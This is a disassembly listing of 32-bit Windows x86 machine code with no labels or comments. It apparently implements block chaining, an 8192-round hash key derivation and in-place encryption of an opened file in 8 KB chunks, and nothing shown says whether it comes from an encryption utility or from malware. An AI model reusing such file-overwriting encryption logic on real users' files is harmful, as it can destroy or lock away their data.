  40891e:	ff 75 10             	push   0x10(%ebp)
  408921:	8d 45 94             	lea    -0x6c(%ebp),%eax
  408924:	50                   	push   %eax
  408925:	e8 90 f4 ff ff       	call   0x407dba
  40892a:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40892d:	50                   	push   %eax
  40892e:	e8 27 f3 ff ff       	call   0x407c5a
  408933:	8b e5                	mov    %ebp,%esp
  408935:	5d                   	pop    %ebp
  408936:	c2 10 00             	ret    $0x10
  408939:	8b 44 24 08          	mov    0x8(%esp),%eax
  40893d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  408941:	85 c0                	test   %eax,%eax
  408943:	74 07                	je     0x40894c
  408945:	c6 01 00             	movb   $0x0,(%ecx)
  408948:	41                   	inc    %ecx
  408949:	48                   	dec    %eax
  40894a:	75 f9                	jne    0x408945
  40894c:	c2 08 00             	ret    $0x8
  40894f:	83 ec 24             	sub    $0x24,%esp
  408952:	33 c0                	xor    %eax,%eax
  408954:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  408959:	55                   	push   %ebp
  40895a:	57                   	push   %edi
  40895b:	8d 7c 24 0d          	lea    0xd(%esp),%edi
  40895f:	83 64 24 08 00       	andl   $0x0,0x8(%esp)
  408964:	ab                   	stos   %eax,%es:(%edi)
  408965:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  408969:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  40896d:	c6 44 24 1c 00       	movb   $0x0,0x1c(%esp)
  408972:	ab                   	stos   %eax,%es:(%edi)
  408973:	ab                   	stos   %eax,%es:(%edi)
  408974:	66 ab                	stos   %ax,%es:(%edi)
  408976:	aa                   	stos   %al,%es:(%edi)
  408977:	33 c0                	xor    %eax,%eax
  408979:	8d 7c 24 1d          	lea    0x1d(%esp),%edi
  40897d:	ab                   	stos   %eax,%es:(%edi)
  40897e:	ab                   	stos   %eax,%es:(%edi)
  40897f:	ab                   	stos   %eax,%es:(%edi)
  408980:	66 ab                	stos   %ax,%es:(%edi)
  408982:	aa                   	stos   %al,%es:(%edi)
  408983:	8b 44 24 38          	mov    0x38(%esp),%eax
  408987:	8b f9                	mov    %ecx,%edi
  408989:	85 c0                	test   %eax,%eax
  40898b:	0f 8e 9e 00 00 00    	jle    0x408a2f
  408991:	53                   	push   %ebx
  408992:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  408996:	8d 44 24 10          	lea    0x10(%esp),%eax
  40899a:	56                   	push   %esi
  40899b:	2b d8                	sub    %eax,%ebx
  40899d:	33 f6                	xor    %esi,%esi
  40899f:	6a 10                	push   $0x10
  4089a1:	8d 44 24 28          	lea    0x28(%esp),%eax
  4089a5:	57                   	push   %edi
  4089a6:	50                   	push   %eax
  4089a7:	e8 79 9c ff ff       	call   0x402625
  4089ac:	83 c4 0c             	add    $0xc,%esp
  4089af:	8d 44 24 14          	lea    0x14(%esp),%eax
  4089b3:	50                   	push   %eax
  4089b4:	57                   	push   %edi
  4089b5:	6a 00                	push   $0x0
  4089b7:	ff 74 24 50          	push   0x50(%esp)
  4089bb:	e8 6f a2 ff ff       	call   0x402c2f
  4089c0:	33 d2                	xor    %edx,%edx
  4089c2:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4089c6:	03 ca                	add    %edx,%ecx
  4089c8:	8a 04 0b             	mov    (%ebx,%ecx,1),%al
  4089cb:	30 01                	xor    %al,(%ecx)
  4089cd:	42                   	inc    %edx
  4089ce:	83 fa 10             	cmp    $0x10,%edx
  4089d1:	7c ef                	jl     0x4089c2
  4089d3:	85 ed                	test   %ebp,%ebp
  4089d5:	74 17                	je     0x4089ee
  4089d7:	6a 00                	push   $0x0
  4089d9:	8d 44 24 14          	lea    0x14(%esp),%eax
  4089dd:	50                   	push   %eax
  4089de:	6a 10                	push   $0x10
  4089e0:	8d 44 24 20          	lea    0x20(%esp),%eax
  4089e4:	50                   	push   %eax
  4089e5:	55                   	push   %ebp
  4089e6:	ff 15 b4 10 40 00    	call   *0x4010b4
  4089ec:	eb 16                	jmp    0x408a04
  4089ee:	6a 10                	push   $0x10
  4089f0:	8d 44 24 18          	lea    0x18(%esp),%eax
  4089f4:	50                   	push   %eax
  4089f5:	8b 44 24 44          	mov    0x44(%esp),%eax
  4089f9:	03 c6                	add    %esi,%eax
  4089fb:	50                   	push   %eax
  4089fc:	e8 24 9c ff ff       	call   0x402625
  408a01:	83 c4 0c             	add    $0xc,%esp
  408a04:	6a 10                	push   $0x10
  408a06:	8d 44 24 28          	lea    0x28(%esp),%eax
  408a0a:	50                   	push   %eax
  408a0b:	ff 74 24 40          	push   0x40(%esp)
  408a0f:	e8 11 9c ff ff       	call   0x402625
  408a14:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  408a18:	83 c6 10             	add    $0x10,%esi
  408a1b:	83 c4 0c             	add    $0xc,%esp
  408a1e:	83 c7 10             	add    $0x10,%edi
  408a21:	3b f0                	cmp    %eax,%esi
  408a23:	0f 8c 76 ff ff ff    	jl     0x40899f
  408a29:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  408a2d:	5e                   	pop    %esi
  408a2e:	5b                   	pop    %ebx
  408a2f:	5f                   	pop    %edi
  408a30:	85 ed                	test   %ebp,%ebp
  408a32:	5d                   	pop    %ebp
  408a33:	75 04                	jne    0x408a39
  408a35:	c6 04 01 00          	movb   $0x0,(%ecx,%eax,1)
  408a39:	83 c4 24             	add    $0x24,%esp
  408a3c:	c2 18 00             	ret    $0x18
  408a3f:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  408a43:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408a47:	53                   	push   %ebx
  408a48:	57                   	push   %edi
  408a49:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  408a4c:	8b fb                	mov    %ebx,%edi
  408a4e:	2b f8                	sub    %eax,%edi
  408a50:	2b f9                	sub    %ecx,%edi
  408a52:	8b c7                	mov    %edi,%eax
  408a54:	99                   	cltd
  408a55:	3b 54 24 18          	cmp    0x18(%esp),%edx
  408a59:	7f 61                	jg     0x408abc
  408a5b:	7c 06                	jl     0x408a63
  408a5d:	3b 44 24 14          	cmp    0x14(%esp),%eax
  408a61:	73 59                	jae    0x408abc
  408a63:	55                   	push   %ebp
  408a64:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  408a68:	2b eb                	sub    %ebx,%ebp
  408a6a:	56                   	push   %esi
  408a6b:	6a 10                	push   $0x10
  408a6d:	8b f3                	mov    %ebx,%esi
  408a6f:	59                   	pop    %ecx
  408a70:	8a 04 2e             	mov    (%esi,%ebp,1),%al
  408a73:	30 06                	xor    %al,(%esi)
  408a75:	46                   	inc    %esi
  408a76:	49                   	dec    %ecx
  408a77:	75 f7                	jne    0x408a70
  408a79:	53                   	push   %ebx
  408a7a:	53                   	push   %ebx
  408a7b:	6a 01                	push   $0x1
  408a7d:	ff 74 24 30          	push   0x30(%esp)
  408a81:	e8 a9 a1 ff ff       	call   0x402c2f
  408a86:	6a 10                	push   $0x10
  408a88:	53                   	push   %ebx
  408a89:	ff 74 24 30          	push   0x30(%esp)
  408a8d:	e8 74 e4 ff ff       	call   0x406f06
  408a92:	6a 10                	push   $0x10
  408a94:	53                   	push   %ebx
  408a95:	ff 74 24 1c          	push   0x1c(%esp)
  408a99:	e8 87 9b ff ff       	call   0x402625
  408a9e:	83 c7 10             	add    $0x10,%edi
  408aa1:	83 c4 0c             	add    $0xc,%esp
  408aa4:	8b c7                	mov    %edi,%eax
  408aa6:	83 ed 10             	sub    $0x10,%ebp
  408aa9:	99                   	cltd
  408aaa:	8b de                	mov    %esi,%ebx
  408aac:	3b 54 24 20          	cmp    0x20(%esp),%edx
  408ab0:	7c b9                	jl     0x408a6b
  408ab2:	7f 06                	jg     0x408aba
  408ab4:	3b 44 24 1c          	cmp    0x1c(%esp),%eax
  408ab8:	72 b1                	jb     0x408a6b
  408aba:	5e                   	pop    %esi
  408abb:	5d                   	pop    %ebp
  408abc:	5f                   	pop    %edi
  408abd:	5b                   	pop    %ebx
  408abe:	c2 20 00             	ret    $0x20
  408ac1:	55                   	push   %ebp
  408ac2:	8b ec                	mov    %esp,%ebp
  408ac4:	51                   	push   %ecx
  408ac5:	51                   	push   %ecx
  408ac6:	ff 75 14             	push   0x14(%ebp)
  408ac9:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  408acd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408ad0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408ad4:	50                   	push   %eax
  408ad5:	ff 75 10             	push   0x10(%ebp)
  408ad8:	ff 75 0c             	push   0xc(%ebp)
  408adb:	ff 75 08             	push   0x8(%ebp)
  408ade:	ff 15 24 10 40 00    	call   *0x401024
  408ae4:	85 c0                	test   %eax,%eax
  408ae6:	75 11                	jne    0x408af9
  408ae8:	ff 15 bc 10 40 00    	call   *0x4010bc
  408aee:	85 c0                	test   %eax,%eax
  408af0:	74 07                	je     0x408af9
  408af2:	83 ca ff             	or     $0xffffffff,%edx
  408af5:	8b c2                	mov    %edx,%eax
  408af7:	eb 06                	jmp    0x408aff
  408af9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408afc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408aff:	8b e5                	mov    %ebp,%esp
  408b01:	5d                   	pop    %ebp
  408b02:	c2 10 00             	ret    $0x10
  408b05:	68 60 01 00 00       	push   $0x160
  408b0a:	68 f0 a3 40 00       	push   $0x40a3f0
  408b0f:	e8 54 96 ff ff       	call   0x402168
  408b14:	33 db                	xor    %ebx,%ebx
  408b16:	89 9d 90 fe ff ff    	mov    %ebx,-0x170(%ebp)
  408b1c:	68 14 01 00 00       	push   $0x114
  408b21:	53                   	push   %ebx
  408b22:	8d 85 94 fe ff ff    	lea    -0x16c(%ebp),%eax
  408b28:	50                   	push   %eax
  408b29:	e8 19 9b ff ff       	call   0x402647
  408b2e:	83 c4 0c             	add    $0xc,%esp
  408b31:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  408b34:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  408b37:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  408b3a:	8b 75 0c             	mov    0xc(%ebp),%esi
  408b3d:	83 c6 f0             	add    $0xfffffff0,%esi
  408b40:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408b43:	88 5d a8             	mov    %bl,-0x58(%ebp)
  408b46:	6a 07                	push   $0x7
  408b48:	59                   	pop    %ecx
  408b49:	33 c0                	xor    %eax,%eax
  408b4b:	8d 7d a9             	lea    -0x57(%ebp),%edi
  408b4e:	f3 ab                	rep stos %eax,%es:(%edi)
  408b50:	66 ab                	stos   %ax,%es:(%edi)
  408b52:	aa                   	stos   %al,%es:(%edi)
  408b53:	88 5d c8             	mov    %bl,-0x38(%ebp)
  408b56:	33 c0                	xor    %eax,%eax
  408b58:	8d 7d c9             	lea    -0x37(%ebp),%edi
  408b5b:	ab                   	stos   %eax,%es:(%edi)
  408b5c:	ab                   	stos   %eax,%es:(%edi)
  408b5d:	ab                   	stos   %eax,%es:(%edi)
  408b5e:	66 ab                	stos   %ax,%es:(%edi)
  408b60:	aa                   	stos   %al,%es:(%edi)
  408b61:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  408b67:	50                   	push   %eax
  408b68:	e8 1c 9d ff ff       	call   0x402889
  408b6d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408b70:	50                   	push   %eax
  408b71:	e8 1b e1 ff ff       	call   0x406c91
  408b76:	6a 01                	push   $0x1
  408b78:	6a 06                	push   $0x6
  408b7a:	e8 f3 e0 ff ff       	call   0x406c72
  408b7f:	50                   	push   %eax
  408b80:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408b83:	50                   	push   %eax
  408b84:	e8 61 e1 ff ff       	call   0x406cea
  408b89:	85 c0                	test   %eax,%eax
  408b8b:	0f 85 94 00 00 00    	jne    0x408c25
  408b91:	6a 10                	push   $0x10
  408b93:	8b 7d 08             	mov    0x8(%ebp),%edi
  408b96:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  408b99:	50                   	push   %eax
  408b9a:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408b9d:	50                   	push   %eax
  408b9e:	e8 82 9a ff ff       	call   0x402625
  408ba3:	6a 10                	push   $0x10
  408ba5:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408ba8:	50                   	push   %eax
  408ba9:	8d 45 a8             	lea    -0x58(%ebp),%eax
  408bac:	50                   	push   %eax
  408bad:	e8 73 9a ff ff       	call   0x402625
  408bb2:	83 c4 18             	add    $0x18,%esp
  408bb5:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  408bb8:	81 fb 00 20 00 00    	cmp    $0x2000,%ebx
  408bbe:	7d 37                	jge    0x408bf7
  408bc0:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408bc3:	50                   	push   %eax
  408bc4:	e8 d9 e1 ff ff       	call   0x406da2
  408bc9:	6a 20                	push   $0x20
  408bcb:	8d 45 a8             	lea    -0x58(%ebp),%eax
  408bce:	50                   	push   %eax
  408bcf:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408bd2:	50                   	push   %eax
  408bd3:	e8 ea e1 ff ff       	call   0x406dc2
  408bd8:	ff 75 14             	push   0x14(%ebp)
  408bdb:	ff 75 10             	push   0x10(%ebp)
  408bde:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408be1:	50                   	push   %eax
  408be2:	e8 db e1 ff ff       	call   0x406dc2
  408be7:	8d 45 a8             	lea    -0x58(%ebp),%eax
  408bea:	50                   	push   %eax
  408beb:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408bee:	50                   	push   %eax
  408bef:	e8 f6 e1 ff ff       	call   0x406dea
  408bf4:	43                   	inc    %ebx
  408bf5:	eb be                	jmp    0x408bb5
  408bf7:	68 00 01 00 00       	push   $0x100
  408bfc:	8d 45 a8             	lea    -0x58(%ebp),%eax
  408bff:	50                   	push   %eax
  408c00:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  408c06:	50                   	push   %eax
  408c07:	e8 19 9f ff ff       	call   0x402b25
  408c0c:	ff 75 18             	push   0x18(%ebp)
  408c0f:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408c12:	50                   	push   %eax
  408c13:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  408c19:	50                   	push   %eax
  408c1a:	56                   	push   %esi
  408c1b:	57                   	push   %edi
  408c1c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408c1f:	50                   	push   %eax
  408c20:	e8 2a fd ff ff       	call   0x40894f
  408c25:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  408c29:	e8 08 00 00 00       	call   0x408c36
  408c2e:	e8 70 95 ff ff       	call   0x4021a3
  408c33:	c2 14 00             	ret    $0x14
  408c36:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  408c3c:	50                   	push   %eax
  408c3d:	e8 5d 9c ff ff       	call   0x40289f
  408c42:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408c45:	50                   	push   %eax
  408c46:	e8 59 e0 ff ff       	call   0x406ca4
  408c4b:	c3                   	ret
  408c4c:	55                   	push   %ebp
  408c4d:	8b ec                	mov    %esp,%ebp
  408c4f:	83 ec 0c             	sub    $0xc,%esp
  408c52:	53                   	push   %ebx
  408c53:	56                   	push   %esi
  408c54:	57                   	push   %edi
  408c55:	33 db                	xor    %ebx,%ebx
  408c57:	53                   	push   %ebx
  408c58:	ff 75 10             	push   0x10(%ebp)
  408c5b:	ff 75 0c             	push   0xc(%ebp)
  408c5e:	ff 75 08             	push   0x8(%ebp)
  408c61:	e8 5b fe ff ff       	call   0x408ac1
  408c66:	8b 7d 14             	mov    0x14(%ebp),%edi
  408c69:	8b f7                	mov    %edi,%esi
  408c6b:	c1 e6 0d             	shl    $0xd,%esi
  408c6e:	03 75 1c             	add    0x1c(%ebp),%esi
  408c71:	56                   	push   %esi
  408c72:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  408c75:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  408c78:	e8 fc 9a ff ff       	call   0x402779
  408c7d:	8b d8                	mov    %eax,%ebx
  408c7f:	59                   	pop    %ecx
  408c80:	85 db                	test   %ebx,%ebx
  408c82:	0f 84 e6 00 00 00    	je     0x408d6e
  408c88:	56                   	push   %esi
  408c89:	6a 00                	push   $0x0
  408c8b:	53                   	push   %ebx
  408c8c:	e8 b6 99 ff ff       	call   0x402647
  408c91:	83 c4 0c             	add    $0xc,%esp
  408c94:	8d 45 f8             	lea    -0x8(%ebp),%eax
  408c97:	6a 00                	push   $0x0
  408c99:	50                   	push   %eax
  408c9a:	56                   	push   %esi
  408c9b:	53                   	push   %ebx
  408c9c:	ff 75 08             	push   0x8(%ebp)
  408c9f:	ff 15 6c 10 40 00    	call   *0x40106c
  408ca5:	8b 45 18             	mov    0x18(%ebp),%eax
  408ca8:	33 c9                	xor    %ecx,%ecx
  408caa:	33 f6                	xor    %esi,%esi
  408cac:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408caf:	85 c0                	test   %eax,%eax
  408cb1:	7c 53                	jl     0x408d06
  408cb3:	7f 04                	jg     0x408cb9
  408cb5:	85 ff                	test   %edi,%edi
  408cb7:	74 4d                	je     0x408d06
  408cb9:	6a 00                	push   $0x0
  408cbb:	6a 02                	push   $0x2
  408cbd:	51                   	push   %ecx
  408cbe:	56                   	push   %esi
  408cbf:	e8 10 17 00 00       	call   0x40a3d4
  408cc4:	0b c2                	or     %edx,%eax
  408cc6:	75 24                	jne    0x408cec
  408cc8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ccb:	8b ce                	mov    %esi,%ecx
  408ccd:	0f a4 c8 0d          	shld   $0xd,%ecx,%eax
  408cd1:	50                   	push   %eax
  408cd2:	c1 e1 0d             	shl    $0xd,%ecx
  408cd5:	51                   	push   %ecx
  408cd6:	ff 75 2c             	push   0x2c(%ebp)
  408cd9:	ff 75 28             	push   0x28(%ebp)
  408cdc:	6a 00                	push   $0x0
  408cde:	68 00 20 00 00       	push   $0x2000
  408ce3:	53                   	push   %ebx
  408ce4:	ff 75 24             	push   0x24(%ebp)
  408ce7:	e8 53 fd ff ff       	call   0x408a3f
  408cec:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408cef:	83 c6 01             	add    $0x1,%esi
  408cf2:	83 d1 00             	adc    $0x0,%ecx
  408cf5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408cf8:	3b 4d 18             	cmp    0x18(%ebp),%ecx
  408cfb:	7c bc                	jl     0x408cb9
  408cfd:	7f 04                	jg     0x408d03
  408cff:	3b f7                	cmp    %edi,%esi
  408d01:	72 b6                	jb     0x408cb9
  408d03:	8b 45 18             	mov    0x18(%ebp),%eax
  408d06:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  408d0a:	7c 38                	jl     0x408d44
  408d0c:	7f 06                	jg     0x408d14
  408d0e:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  408d12:	76 30                	jbe    0x408d44
  408d14:	6a 00                	push   $0x0
  408d16:	6a 02                	push   $0x2
  408d18:	50                   	push   %eax
  408d19:	57                   	push   %edi
  408d1a:	e8 b5 16 00 00       	call   0x40a3d4
  408d1f:	0b c2                	or     %edx,%eax
  408d21:	75 21                	jne    0x408d44
  408d23:	8b 45 18             	mov    0x18(%ebp),%eax
  408d26:	0f a4 f8 0d          	shld   $0xd,%edi,%eax
  408d2a:	50                   	push   %eax
  408d2b:	c1 e7 0d             	shl    $0xd,%edi
  408d2e:	57                   	push   %edi
  408d2f:	ff 75 2c             	push   0x2c(%ebp)
  408d32:	ff 75 28             	push   0x28(%ebp)
  408d35:	ff 75 20             	push   0x20(%ebp)
  408d38:	ff 75 1c             	push   0x1c(%ebp)
  408d3b:	53                   	push   %ebx
  408d3c:	ff 75 24             	push   0x24(%ebp)
  408d3f:	e8 fb fc ff ff       	call   0x408a3f
  408d44:	6a 00                	push   $0x0
  408d46:	ff 75 10             	push   0x10(%ebp)
  408d49:	ff 75 0c             	push   0xc(%ebp)
  408d4c:	ff 75 08             	push   0x8(%ebp)
  408d4f:	e8 6d fd ff ff       	call   0x408ac1
  408d54:	6a 00                	push   $0x0
  408d56:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408d59:	50                   	push   %eax
  408d5a:	ff 75 f8             	push   -0x8(%ebp)
  408d5d:	53                   	push   %ebx
  408d5e:	ff 75 08             	push   0x8(%ebp)
  408d61:	ff 15 b4 10 40 00    	call   *0x4010b4
  408d67:	53                   	push   %ebx
  408d68:	e8 f8 99 ff ff       	call   0x402765
  408d6d:	59                   	pop    %ecx
  408d6e:	5f                   	pop    %edi
  408d6f:	5e                   	pop    %esi
  408d70:	5b                   	pop    %ebx
  408d71:	8b e5                	mov    %ebp,%esp
  408d73:	5d                   	pop    %ebp
  408d74:	c2 28 00             	ret    $0x28
  408d77:	81 ec 90 01 00 00    	sub    $0x190,%esp
  408d7d:	53                   	push   %ebx
  408d7e:	55                   	push   %ebp
  408d7f:	56                   	push   %esi
  408d80:	57                   	push   %edi
  408d81:	33 db                	xor    %ebx,%ebx
  408d83:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
  408d8a:	68 14 01 00 00       	push   $0x114
  408d8f:	53                   	push   %ebx
  408d90:	50                   	push   %eax
  408d91:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  408d95:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  408d99:	89 9c 24 94 00 00 00 	mov    %ebx,0x94(%esp)
  408da0:	e8 a2 98 ff ff       	call   0x402647
  408da5:	33 ff                	xor    %edi,%edi
  408da7:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  408dab:	47                   	inc    %edi
  408dac:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  408db0:	57                   	push   %edi
  408db1:	6a 20                	push   $0x20
  408db3:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  408db7:	e8 8f 99 ff ff       	call   0x40274b
  408dbc:	83 c4 14             	add    $0x14,%esp
  408dbf:	89 5c 24 44          	mov    %ebx,0x44(%esp)
  408dc3:	8b e8                	mov    %eax,%ebp
  408dc5:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  408dc9:	53                   	push   %ebx
  408dca:	68 00 00 00 80       	push   $0x80000000
  408dcf:	6a 03                	push   $0x3
  408dd1:	53                   	push   %ebx
  408dd2:	53                   	push   %ebx
  408dd3:	68 00 00 00 c0       	push   $0xc0000000
  408dd8:	ff b4 24 bc 01 00 00 	push   0x1bc(%esp)
  408ddf:	ff 15 30 10 40 00    	call   *0x401030
  408de5:	8b d8                	mov    %eax,%ebx
  408de7:	83 fb ff             	cmp    $0xffffffff,%ebx
  408dea:	0f 84 01 04 00 00    	je     0x4091f1
  408df0:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  408df4:	50                   	push   %eax
  408df5:	53                   	push   %ebx
  408df6:	ff 15 b8 10 40 00    	call   *0x4010b8
  408dfc:	85 c0                	test   %eax,%eax
  408dfe:	0f 84 ed 03 00 00    	je     0x4091f1
  408e04:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  408e08:	0b 44 24 20          	or     0x20(%esp),%eax
  408e0c:	0f 84 df 03 00 00    	je     0x4091f1
  408e12:	6a 0f                	push   $0xf
  408e14:	5e                   	pop    %esi
  408e15:	6a 20                	push   $0x20
  408e17:	55                   	push   %ebp
  408e18:	ff b4 24 b8 01 00 00 	push   0x1b8(%esp)
  408e1f:	4e                   	dec    %esi
  408e20:	e8 55 d8 ff ff       	call   0x40667a
  408e25:	85 c0                	test   %eax,%eax
  408e27:	74 04                	je     0x408e2d
  408e29:	85 f6                	test   %esi,%esi
  408e2b:	75 e8                	jne    0x408e15
  408e2d:	3b f7                	cmp    %edi,%esi
  408e2f:	7d 07                	jge    0x408e38
  408e31:	8b c7                	mov    %edi,%eax
  408e33:	e9 e6 03 00 00       	jmp    0x40921e
  408e38:	33 c0                	xor    %eax,%eax
  408e3a:	c6 44 24 48 00       	movb   $0x0,0x48(%esp)
  408e3f:	8d 7c 24 49          	lea    0x49(%esp),%edi
  408e43:	c6 44 24 58 00       	movb   $0x0,0x58(%esp)
  408e48:	ab                   	stos   %eax,%es:(%edi)
  408e49:	6a 07                	push   $0x7
  408e4b:	59                   	pop    %ecx
  408e4c:	ab                   	stos   %eax,%es:(%edi)
  408e4d:	ab                   	stos   %eax,%es:(%edi)
  408e4e:	66 ab                	stos   %ax,%es:(%edi)
  408e50:	aa                   	stos   %al,%es:(%edi)
  408e51:	33 c0                	xor    %eax,%eax
  408e53:	8d 7c 24 59          	lea    0x59(%esp),%edi
  408e57:	f3 ab                	rep stos %eax,%es:(%edi)
  408e59:	66 ab                	stos   %ax,%es:(%edi)
  408e5b:	aa                   	stos   %al,%es:(%edi)
  408e5c:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  408e63:	50                   	push   %eax
  408e64:	e8 20 9a ff ff       	call   0x402889
  408e69:	8d 44 24 10          	lea    0x10(%esp),%eax
  408e6d:	50                   	push   %eax
  408e6e:	e8 1e de ff ff       	call   0x406c91
  408e73:	6a 01                	push   $0x1
  408e75:	6a 06                	push   $0x6
  408e77:	e8 f6 dd ff ff       	call   0x406c72
  408e7c:	50                   	push   %eax
  408e7d:	8d 44 24 18          	lea    0x18(%esp),%eax
  408e81:	50                   	push   %eax
  408e82:	e8 63 de ff ff       	call   0x406cea
  408e87:	8b f0                	mov    %eax,%esi
  408e89:	85 f6                	test   %esi,%esi
  408e8b:	0f 85 62 03 00 00    	jne    0x4091f3
  408e91:	33 d2                	xor    %edx,%edx
  408e93:	8a 44 24 1c          	mov    0x1c(%esp),%al
  408e97:	8a ca                	mov    %dl,%cl
  408e99:	c0 e1 03             	shl    $0x3,%cl
  408e9c:	d2 e8                	shr    %cl,%al
  408e9e:	88 44 14 58          	mov    %al,0x58(%esp,%edx,1)
  408ea2:	42                   	inc    %edx
  408ea3:	83 fa 08             	cmp    $0x8,%edx
  408ea6:	7c eb                	jl     0x408e93
  408ea8:	8d 44 24 10          	lea    0x10(%esp),%eax
  408eac:	50                   	push   %eax
  408ead:	e8 f0 de ff ff       	call   0x406da2
  408eb2:	6a 08                	push   $0x8
  408eb4:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  408eb8:	50                   	push   %eax
  408eb9:	8d 44 24 18          	lea    0x18(%esp),%eax
  408ebd:	50                   	push   %eax
  408ebe:	e8 ff de ff ff       	call   0x406dc2
  408ec3:	ff b4 24 a4 01 00 00 	push   0x1a4(%esp)
  408eca:	ff 15 2c 10 40 00    	call   *0x40102c
  408ed0:	50                   	push   %eax
  408ed1:	ff b4 24 a8 01 00 00 	push   0x1a8(%esp)
  408ed8:	8d 44 24 18          	lea    0x18(%esp),%eax
  408edc:	50                   	push   %eax
  408edd:	e8 e0 de ff ff       	call   0x406dc2
  408ee2:	8d 44 24 58          	lea    0x58(%esp),%eax
  408ee6:	50                   	push   %eax
  408ee7:	8d 44 24 14          	lea    0x14(%esp),%eax
  408eeb:	50                   	push   %eax
  408eec:	e8 f9 de ff ff       	call   0x406dea
  408ef1:	6a 10                	push   $0x10
  408ef3:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  408ef7:	50                   	push   %eax
  408ef8:	8d 44 24 50          	lea    0x50(%esp),%eax
  408efc:	50                   	push   %eax
  408efd:	e8 23 97 ff ff       	call   0x402625
  408f02:	0f b6 44 24 28       	movzbl 0x28(%esp),%eax
  408f07:	25 0f 00 00 80       	and    $0x8000000f,%eax
  408f0c:	79 05                	jns    0x408f13
  408f0e:	48                   	dec    %eax
  408f0f:	83 c8 f0             	or     $0xfffffff0,%eax
  408f12:	40                   	inc    %eax
  408f13:	89 44 24 30          	mov    %eax,0x30(%esp)
  408f17:	88 44 24 63          	mov    %al,0x63(%esp)
  408f1b:	8d 44 24 54          	lea    0x54(%esp),%eax
  408f1f:	6a 10                	push   $0x10
  408f21:	50                   	push   %eax
  408f22:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
  408f29:	50                   	push   %eax
  408f2a:	e8 f6 96 ff ff       	call   0x402625
  408f2f:	6a 20                	push   $0x20
  408f31:	5f                   	pop    %edi
  408f32:	57                   	push   %edi
  408f33:	8d 44 24 74          	lea    0x74(%esp),%eax
  408f37:	6a 00                	push   $0x0
  408f39:	50                   	push   %eax
  408f3a:	e8 08 97 ff ff       	call   0x402647
  408f3f:	6a 10                	push   $0x10
  408f41:	8d 44 24 70          	lea    0x70(%esp),%eax
  408f45:	50                   	push   %eax
  408f46:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  408f4d:	50                   	push   %eax
  408f4e:	e8 d2 96 ff ff       	call   0x402625
  408f53:	83 c4 30             	add    $0x30,%esp
  408f56:	6a 02                	push   $0x2
  408f58:	5e                   	pop    %esi
  408f59:	8d 44 24 10          	lea    0x10(%esp),%eax
  408f5d:	50                   	push   %eax
  408f5e:	e8 3f de ff ff       	call   0x406da2
  408f63:	57                   	push   %edi
  408f64:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  408f68:	50                   	push   %eax
  408f69:	8d 44 24 18          	lea    0x18(%esp),%eax
  408f6d:	50                   	push   %eax
  408f6e:	e8 4f de ff ff       	call   0x406dc2
  408f73:	57                   	push   %edi
  408f74:	55                   	push   %ebp
  408f75:	8d 44 24 18          	lea    0x18(%esp),%eax
  408f79:	50                   	push   %eax
  408f7a:	e8 43 de ff ff       	call   0x406dc2
  408f7f:	8d 44 24 58          	lea    0x58(%esp),%eax
  408f83:	50                   	push   %eax
